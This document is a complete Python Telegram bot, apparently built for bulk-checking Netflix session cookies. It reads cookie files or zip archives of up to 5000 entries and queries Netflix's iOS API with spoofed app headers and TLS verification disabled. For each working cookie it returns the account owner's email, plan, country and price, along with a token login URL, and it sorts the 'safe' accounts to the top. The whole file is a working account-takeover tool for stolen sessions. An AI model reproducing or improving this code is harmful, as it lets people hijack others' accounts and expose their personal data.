import asyncio
import io
import json
import logging
import os
import re
import urllib.parse
import zipfile
from datetime import datetime, timezone

import httpx
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from urllib3.exceptions import InsecureRequestWarning

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ["BOT_TOKEN"]
MAX_CONCURRENT = 10
MAX_COOKIES    = 5000

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

ACCOUNT_PARAMS = {
    **QUERY_PARAMS,
    "path": '["account","customer"]',
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS     = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ── File filtering constants ───────────────────────────────────────────────────
# Only these extensions are considered as potential cookie files
ALLOWED_EXTENSIONS = {".txt", ".json", ".csv"}

# Filenames and path segments that are never cookie data
EXCLUDED_NAME_PATTERNS = re.compile(
    r"(__macosx|\.ds_store|thumbs\.db|desktop\.ini|\.udid|\.git|readme|license)",
    re.IGNORECASE,
)

# A valid Netscape cookie file must start with this header or contain NetflixId
NETSCAPE_HEADER = "# Netscape HTTP Cookie File"

# Minimum number of tab-delimited columns in a Netscape cookie line
NETSCAPE_MIN_COLS = 7

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)


# ── Helpers ────────────────────────────────────────────────────────────────────

def format_expiry(ts) -> str:
    if not isinstance(ts, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


def token_validity_label(expires) -> str:
    if not isinstance(expires, (int, float)):
        return "Unknown"
    delta = int(expires) - int(datetime.now(timezone.utc).timestamp())
    if delta <= 0:
        return "Expired"
    days, rem = divmod(delta, 86400)
    hours, rem = divmod(rem, 3600)
    minutes    = rem // 60
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    if hours > 0:
        return f"{hours}h {minutes}m"
    return f"{minutes}m"


def is_expiring_today(ts) -> bool:
    if not isinstance(ts, (int, float)):
        return False
    now   = datetime.now(timezone.utc)
    start = int(now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
    return start <= ts < start + 86400


def _decode_value(v: str) -> str:
    if "%" in v:
        try:
            return urllib.parse.unquote(v)
        except Exception:
            pass
    return v


# ── Smart file filtering ───────────────────────────────────────────────────────

def _is_candidate_path(member_path: str) -> bool:
    """
    Return True only if the zip member path looks like a real cookie file.
    Rejects: directories, hidden/system files, non-text extensions,
    and paths matching EXCLUDED_NAME_PATTERNS.
    """
    # directories
    if member_path.endswith("/"):
        return False

    name = member_path.split("/")[-1]

    # hidden files (Unix dot-files)
    if name.startswith("."):
        return False

    # excluded system/metadata patterns anywhere in the path
    if EXCLUDED_NAME_PATTERNS.search(member_path):
        return False

    # extension filter — only permit known text formats
    ext = os.path.splitext(name)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False

    return True


def _is_netscape_cookie_text(text: str) -> bool:
    """
    Return True if the text is a Netscape HTTP Cookie File that contains
    at least one Netflix cookie line.
    Accepts files with or without the canonical header comment.
    """
    has_netflix_id = False
    has_valid_line = False

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= NETSCAPE_MIN_COLS:
            has_valid_line = True
            if parts[5] in COOKIE_KEYS:
                has_netflix_id = True
                break

    return has_valid_line and has_netflix_id


def _is_json_cookie_text(text: str) -> bool:
    """
    Return True if the text is JSON that contains at least one Netflix
    cookie key (array of {name,value} objects or a flat dict).
    """
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return False

    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                n = item.get("name", "")
                if n in COOKIE_KEYS:
                    return True
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            return True
        for item in data.get("cookies", []):
            if isinstance(item, dict) and item.get("name") in COOKIE_KEYS:
                return True
    return False


def _is_inline_cookie_text(text: str) -> bool:
    """
    Return True if the raw text (plain key=value format) contains NetflixId.
    """
    return bool(re.search(r"(?<!\w)NetflixId\s*=", text))


def _is_valid_cookie_content(text: str) -> bool:
    """
    Gate: does this text actually contain Netflix cookies in any recognised format?
    """
    if _is_netscape_cookie_text(text):
        return True
    if _is_json_cookie_text(text):
        return True
    if _is_inline_cookie_text(text):
        return True
    return False


# ── Cookie parsing (unchanged logic, cleaner helpers) ─────────────────────────

def _parse_netscape_line(line: str) -> dict:
    parts = line.strip().split("\t")
    if len(parts) >= NETSCAPE_MIN_COLS:
        return {parts[5]: parts[6]}
    return {}


def _extract_inline_cookie_string(line: str) -> str | None:
    m = re.search(r'(?:Cookie:\s*)?(NetflixId=.+)', line, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    return None


def extract_cookie_dict(text: str) -> dict:
    out = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        out.update(_parse_netscape_line(line))
        cookie_str = _extract_inline_cookie_string(line)
        if cookie_str:
            for key in COOKIE_KEYS:
                if key in out:
                    continue
                m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", cookie_str)
                if m:
                    out[key] = _decode_value(m.group(1))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for c in data:
            n, v = c.get("name"), c.get("value")
            if n in COOKIE_KEYS and isinstance(v, str):
                out[n] = _decode_value(v)
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    out[k] = _decode_value(v)
        elif isinstance(data.get("cookies"), list):
            for c in data["cookies"]:
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    out[n] = _decode_value(v)

    for key in COOKIE_KEYS:
        if key in out:
            continue
        m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if m:
            out[key] = _decode_value(m.group(1))

    return out


def _split_cookie_blocks(text: str) -> list[str]:
    text = text.strip()
    if not text:
        return []

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        blocks = []
        for item in data:
            if isinstance(item, list):
                blocks.append(json.dumps(item))
            elif isinstance(item, dict):
                if any(k in item for k in COOKIE_KEYS):
                    blocks.append(json.dumps(item))
                elif "name" in item and "value" in item:
                    blocks.append(json.dumps([item]))
        return blocks

    if "📁 Source:" in text or "\r\n---\r\n" in text or "\n---\n" in text:
        chunks = re.split(r'(?=📁 Source:)', text)
        if len(chunks) > 1:
            return [c.strip() for c in chunks if c.strip() and "NetflixId" in c]

    sections = re.split(r"\n{2,}", text)
    if len(sections) > 1:
        return [s.strip() for s in sections if s.strip()]

    return [line.strip() for line in text.splitlines() if line.strip()]


def extract_all_cookies(text: str) -> list[dict]:
    seen, results = set(), []
    for block in _split_cookie_blocks(text):
        cd  = extract_cookie_dict(block)
        nid = cd.get(REQUIRED_COOKIE)
        if nid and nid not in seen:
            seen.add(nid)
            results.append(cd)
    return results[:MAX_COOKIES]


def _read_bytes(data: bytes) -> str:
    for enc in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="replace")


def extract_cookies_from_file(filename: str, data: bytes) -> tuple[list[dict], int, int]:
    """
    Returns (cookie_list, files_scanned, files_skipped).
    files_skipped counts members that failed the content gate.
    """
    if filename.lower().endswith(".zip"):
        all_cookies: list[dict] = []
        seen: set[str]          = set()
        scanned = skipped = 0

        try:
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                candidates = [m for m in zf.namelist() if _is_candidate_path(m)]
                for member in candidates:
                    try:
                        raw_text = _read_bytes(zf.read(member))
                    except Exception:
                        skipped += 1
                        continue

                    if not _is_valid_cookie_content(raw_text):
                        skipped += 1
                        continue

                    scanned += 1
                    for cd in extract_all_cookies(raw_text):
                        nid = cd.get(REQUIRED_COOKIE)
                        if nid and nid not in seen:
                            seen.add(nid)
                            all_cookies.append(cd)

        except zipfile.BadZipFile:
            pass

        return all_cookies[:MAX_COOKIES], scanned, skipped

    # single file
    text = _read_bytes(data)
    if not _is_valid_cookie_content(text):
        return [], 0, 1
    return extract_all_cookies(text), 1, 0


# ── Netflix API (untouched) ────────────────────────────────────────────────────

async def fetch_token(nid: str, client: httpx.AsyncClient) -> tuple[str, int | None]:
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    resp    = await client.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=20)
    resp.raise_for_status()
    data    = resp.json()

    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {})
        .get("default") or {}
    )
    token   = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("no token in response")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


async def fetch_account(nid: str, client: httpx.AsyncClient) -> dict:
    empty = {
        "email": "N/A", "membership": "N/A", "country": "N/A",
        "member_since": "N/A", "num_profiles": "N/A",
        "can_stream": "N/A", "max_streams": "N/A", "subscription_price": "N/A",
    }
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    try:
        resp = await client.get(API_URL, params=ACCOUNT_PARAMS, headers=headers, timeout=20)
        resp.raise_for_status()
        raw  = resp.json()
        acct = ((raw.get("value") or {}).get("account") or {})
        cust = acct.get("customer") or {}
        if isinstance(cust, dict) and "primaryEmail" not in cust:
            cust = cust.get("customer") or cust

        def g(key, fallback="N/A"):
            v = cust.get(key)
            return str(v) if v not in (None, "", {}) else fallback

        streaming = cust.get("currentMembership") or cust.get("membership") or {}
        return {
            "email":              g("primaryEmail"),
            "membership":         g("membershipStatus"),
            "country":            g("countryOfSignup"),
            "member_since":       g("memberSince"),
            "num_profiles":       g("numProfiles"),
            "can_stream":         g("canStream"),
            "max_streams":        str(streaming.get("maxStreams", "N/A")),
            "subscription_price": str(streaming.get("billingMonthlyTotalPrice", "N/A")),
        }
    except Exception:
        return empty


async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.Semaphore) -> dict:
    nid = cookie_dict.get(REQUIRED_COOKIE, "?")
    async with sem:
        try:
            token, expires = await fetch_token(nid, client)
            account        = await fetch_account(nid, client)
            return {
                "status":         "live",
                "netflix_id":     nid,
                "token":          token,
                "expires":        expires,
                "expiring_today": is_expiring_today(expires),
                **account,
                "error":          None,
            }
        except httpx.HTTPStatusError as e:
            code   = e.response.status_code
            status = "dead" if code in (401, 403) else "error"
            return {
                "status": status, "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": f"HTTP {code}",
            }
        except Exception as e:
            return {
                "status": "error", "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": str(e)[:120],
            }


# ── Formatters ─────────────────────────────────────────────────────────────────

# Unicode block-character icons — no emoji, renders in all Telegram clients
ICON_LIVE    = "▶"
ICON_WARN    = "▲"
ICON_DEAD    = "■"
ICON_ERROR   = "◆"
ICON_TOKEN   = "◈"
ICON_CLOCK   = "◷"
ICON_LINK    = "⊕"
ICON_BULLET  = "›"
ICON_DIV     = "─"


def _divider(width: int = 32) -> str:
    return ICON_DIV * width


def account_card(r: dict, index: int | None = None) -> str:
    if r["expiring_today"]:
        status_icon  = ICON_WARN
        status_label = "Expiring Today"
    else:
        status_icon  = ICON_LIVE
        status_label = "Active"

    idx_suffix = f" #{index}" if index is not None else ""
    header     = f"{status_icon} *Netflix Account{idx_suffix}* — {status_label}"
    div        = _divider(32)

    validity   = token_validity_label(r["expires"])
    expiry_str = format_expiry(r["expires"])

    lines = [
        header,
        f"`{div}`",
        f"{ICON_BULLET} *Email*          `{r['email']}`",
        f"{ICON_BULLET} *Plan*           `{r['membership']}`",
        f"{ICON_BULLET} *Country*        `{r['country']}`",
        f"{ICON_BULLET} *Member Since*   `{r['member_since']}`",
        f"{ICON_BULLET} *Profiles*       `{r['num_profiles']}`",
        f"{ICON_BULLET} *Can Stream*     `{r['can_stream']}`",
        f"{ICON_BULLET} *Max Streams*    `{r['max_streams']}`",
        f"{ICON_BULLET} *Sub Price*      `{r['subscription_price']}`",
        f"`{div}`",
        f"{ICON_TOKEN} *Token*",
        f"`https://netflix.com/?nftoken={r['token']}`",
        f"`{div}`",
        f"{ICON_CLOCK} *Expires*   `{expiry_str}`",
        f"{ICON_CLOCK} *Valid For* `{validity}`",
    ]
    return "\n".join(lines)


def build_output(results: list[dict]) -> str:
    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead          = [r for r in results if r["status"] == "dead"]
    error         = [r for r in results if r["status"] == "error"]

    ts  = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    sep = "=" * 64

    L = [
        f"Netflix Token Checker — {ts}",
        f"Total: {len(results)}  "
        f"Live: {len(live)}  "
        f"Safe: {len(live_safe)}  "
        f"Expiring Today: {len(live_expiring)}  "
        f"Dead: {len(dead)}  "
        f"Error: {len(error)}",
        "",
    ]

    def add_block(r: dict):
        L.extend([
            f"Email          : {r['email']}",
            f"Plan           : {r['membership']}",
            f"Country        : {r['country']}",
            f"Member Since   : {r['member_since']}",
            f"Profiles       : {r['num_profiles']}",
            f"Can Stream     : {r['can_stream']}",
            f"Max Streams    : {r['max_streams']}",
            f"Sub Price      : {r['subscription_price']}",
            f"Token Expires  : {format_expiry(r['expires'])}",
            f"Valid For      : {token_validity_label(r['expires'])}",
            f"Login URL      : https://netflix.com/?nftoken={r['token']}",
            f"NetflixId      : {r['netflix_id']}",
            "",
        ])

    if live_safe:
        L += [sep, "LIVE — SAFE", sep]
        for r in live_safe:
            add_block(r)

    if live_expiring:
        L += [sep, "LIVE — EXPIRING TODAY", sep]
        for r in live_expiring:
            add_block(r)

    if dead:
        L += [sep, "DEAD", sep]
        for r in dead:
            L.append(r["netflix_id"])
        L.append("")

    if error:
        L += [sep, "ERRORS", sep]
        for r in error:
            L.append(f"{r['netflix_id']}  —  {r['error']}")
        L.append("")

    return "\n".join(L)


# ── Progress tracker ───────────────────────────────────────────────────────────

class ProgressReporter:
    def __init__(self, message, total: int):
        self.message    = message
        self.total      = total
        self.done       = 0
        self.live       = 0
        self._lock      = asyncio.Lock()
        self._last_edit = 0.0

    async def tick(self, result: dict):
        async with self._lock:
            self.done += 1
            if result.get("status") == "live":
                self.live += 1
            now = asyncio.get_event_loop().time()
            if now - self._last_edit >= 3.0 or self.done == self.total:
                pct = int(self.done / self.total * 100)
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                try:
                    await self.message.edit_text(
                        f"Checking...\n"
                        f"[{bar}] {pct}%\n"
                        f"{self.done}/{self.total}  —  {self.live} live"
                    )
                    self._last_edit = now
                except Exception:
                    pass


# ── Keyboards ──────────────────────────────────────────────────────────────────

def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Help",    callback_data="help"),
        InlineKeyboardButton("Status",  callback_data="status"),
    ]])


def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Back", callback_data="menu"),
    ]])


# ── Bot handlers ───────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*Netflix Token Checker*\n\n"
        "Send a `.txt`, `.json`, or `.zip` cookie file.\n"
        "Or paste a single cookie string as text.\n\n"
        "*Accepted formats*\n"
        "`NetflixId=abc; SecureNetflixId=xyz`\n"
        "Netscape tab-delimited\n"
        "JSON array `[{name, value}]`",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(),
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "menu":
        await q.edit_message_text(
            "*Netflix Token Checker*\n\nSend a file or paste a cookie.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
    elif q.data == "help":
        await q.edit_message_text(
            "*Help*\n\n"
            "Send `.txt` / `.json` / `.zip` for bulk checking.\n"
            "Paste a cookie string for a single check.\n\n"
            "*Zip filtering*\n"
            "Only files with valid Netscape / JSON cookie content are read.\n"
            "System files, metadata, and non-cookie text are automatically skipped.\n\n"
            f"Max cookies per batch: `{MAX_COOKIES}`\n"
            f"Concurrency: `{MAX_CONCURRENT}`\n\n"
            "*Output per account*\n"
            "email · plan · country · member since\n"
            "profiles · streaming limits · sub price\n"
            "token expiry · validity · login URL",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
    elif q.data == "status":
        await q.edit_message_text(
            "*Status*\n\n"
            f"Max cookies  `{MAX_COOKIES}`\n"
            f"Concurrency  `{MAX_CONCURRENT}`\n"
            f"UTC time     `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc      = update.message.document
    filename = doc.file_name or "cookies.txt"
    ext      = os.path.splitext(filename)[1].lower()

    # Reject at intake if the extension is completely wrong
    if ext not in ALLOWED_EXTENSIONS and not filename.lower().endswith(".zip"):
        await update.message.reply_text(
            f"Unsupported file type: `{ext or 'none'}`\n"
            "Send a `.txt`, `.json`, or `.zip` file.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
        return

    status_msg = await update.message.reply_text("Downloading...")

    buf = io.BytesIO()
    tg_file = await context.bot.get_file(doc.file_id)
    await tg_file.download_to_memory(buf)

    cookies, scanned, skipped = extract_cookies_from_file(filename, buf.getvalue())

    if not cookies:
        detail = (
            f"Scanned {scanned} file(s), skipped {skipped} (no cookie content)."
            if scanned + skipped > 0
            else "No recognisable cookie data found."
        )
        await status_msg.edit_text(
            f"No valid cookies found.\n{detail}\n"
            "File must contain `NetflixId=` entries in a supported format.",
            reply_markup=main_menu_kb(),
        )
        return

    scan_note = f"{scanned} file(s) read" + (f", {skipped} skipped" if skipped else "")
    await status_msg.edit_text(
        f"Found {len(cookies)} cookie(s) ({scan_note}). Checking..."
    )

    sem      = asyncio.Semaphore(MAX_CONCURRENT)
    reporter = ProgressReporter(status_msg, len(cookies))

    async with httpx.AsyncClient(verify=False) as client:
        tasks   = [check_one(cd, client, sem) for cd in cookies]
        results = []
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            await reporter.tick(r)

    results.sort(key=lambda r: (
        {"live": 0, "dead": 1, "error": 2}[r["status"]],
        1 if r.get("expiring_today") else 0,
    ))

    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead_count    = sum(1 for r in results if r["status"] == "dead")
    error_count   = sum(1 for r in results if r["status"] == "error")

    # Show first safe live account card
    first = next((r for r in live if not r["expiring_today"]), live[0] if live else None)
    if first:
        await update.message.reply_text(
            account_card(first, index=1),
            parse_mode="Markdown",
        )

    # Summary
    await status_msg.edit_text(
        f"*Results*\n\n"
        f"Total          `{len(results)}`\n"
        f"Live           `{len(live)}`\n"
        f"  {ICON_LIVE} Safe         `{len(live_safe)}`\n"
        f"  {ICON_WARN} Exp. Today   `{len(live_expiring)}`\n"
        f"{ICON_DEAD} Dead         `{dead_count}`\n"
        f"{ICON_ERROR} Errors       `{error_count}`",
        parse_mode="Markdown",
    )

    # Results file
    out_buf      = io.BytesIO(build_output(results).encode("utf-8"))
    out_buf.name = f"results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
    await update.message.reply_document(
        document=out_buf,
        filename=out_buf.name,
        caption="Safe accounts at top. Expiring-today accounts separated.",
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    if not text:
        return

    cd = extract_cookie_dict(text)
    if not cd.get(REQUIRED_COOKIE):
        await update.message.reply_text(
            "No `NetflixId` found in input.\n"
            "Send a file for bulk checking.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
        return

    msg = await update.message.reply_text("Checking...")
    sem = asyncio.Semaphore(1)

    async with httpx.AsyncClient(verify=False) as client:
        result = await check_one(cd, client, sem)

    if result["status"] == "live":
        await msg.edit_text(account_card(result), parse_mode="Markdown")
    elif result["status"] == "dead":
        await msg.edit_text(
            f"{ICON_DEAD} *Dead* — Cookie is invalid or expired.",
            parse_mode="Markdown",
        )
    else:
        await msg.edit_text(
            f"{ICON_ERROR} *Error* — `{result['error']}`",
            parse_mode="Markdown",
        )


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    log.info("Bot running.")
    app.run_polling()


if __name__ == "__main__":
    main()
